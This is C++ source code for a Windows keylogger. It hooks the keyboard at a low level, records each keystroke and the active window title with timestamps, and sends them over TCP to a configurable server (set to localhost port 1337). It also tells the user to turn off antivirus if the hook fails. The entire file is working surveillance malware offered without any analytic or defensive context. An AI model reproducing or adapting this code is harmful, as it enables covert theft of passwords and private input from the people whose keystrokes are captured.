// Keylogger.cpp: определяет точку входа для приложения.
//

#include "stdafx.h"
#include "Keylogger.h"
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <cstdio>
#include <time.h>
#include <websocket.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#define DEFAULT_BUFLEN 20000
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT "1337"
WSADATA wsaData;
SOCKET ConnectSocket = INVALID_SOCKET;
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
char lastwindow[256];
int Save(int key_stroke);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbdStruct.vkCode);
		}
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Turn off your AV software!", "Error", MB_ICONERROR); 
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

void sendData(char *ip, char * port, char*data)
{
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return;
	}

	// Send an initial buffer
	iResult = send(ConnectSocket, data, (int)strlen(data), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}

	// shutdown the connection since no more data will be sent
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();
}

int Save(int key_stroke)
{

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks

	HWND foreground = GetForegroundWindow();
	if (foreground)
	{
		char window_title[256];
		GetWindowText(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);
			char data[DEFAULT_BUFLEN];
			sprintf(data, "\n\n[Window: %s - at %s]\n", window_title, s);
			sendData(SERVER_IP, SERVER_PORT, data);
			
		}
	}

	if (key_stroke == VK_BACK)
		sendData(SERVER_IP, SERVER_PORT,"[BACKSPACE]");
	else if (key_stroke == VK_RETURN)
		sendData(SERVER_IP, SERVER_PORT,"[ENTER]");
	else if (key_stroke == VK_SPACE)
		sendData(SERVER_IP, SERVER_PORT,"[SPACE]");
	else if (key_stroke == VK_TAB)
		sendData(SERVER_IP, SERVER_PORT,"[TAB]");
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		sendData(SERVER_IP, SERVER_PORT,"[SHIFT]");
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		sendData(SERVER_IP, SERVER_PORT,"[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		sendData(SERVER_IP, SERVER_PORT,"[ESCAPE]");
	else if (key_stroke == VK_END)
		sendData(SERVER_IP, SERVER_PORT,"[END]");
	else if (key_stroke == VK_HOME)
		sendData(SERVER_IP, SERVER_PORT,"[HOME]");
	else if (key_stroke == VK_LEFT)
		sendData(SERVER_IP, SERVER_PORT,"[LEFT]");
	else if (key_stroke == VK_UP)
		sendData(SERVER_IP, SERVER_PORT,"[UP]");
	else if (key_stroke == VK_RIGHT)
		sendData(SERVER_IP, SERVER_PORT,"[RIGHT]");
	else if (key_stroke == VK_DOWN)
		sendData(SERVER_IP, SERVER_PORT,"[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		sendData(SERVER_IP, SERVER_PORT,".");
	else if (key_stroke == 189 || key_stroke == 109)
		sendData(SERVER_IP, SERVER_PORT,"-");
	else if (key_stroke == 20)
		sendData(SERVER_IP, SERVER_PORT,"[CAPSLOCK]");
	else {
		if (key_stroke >= 96 && key_stroke <= 105)
		{
			key_stroke -= 48;
		}
		else if (key_stroke >= 65 && key_stroke <= 90) { 
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
			if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
				lowercase = !lowercase;
			}

			if (lowercase) key_stroke += 32;
		}
		char c[512];
		sprintf(c, "%c", key_stroke);
		sendData(SERVER_IP, SERVER_PORT, c);
	}
	return 0;
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{

	SetHook();
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
	
	
	
}
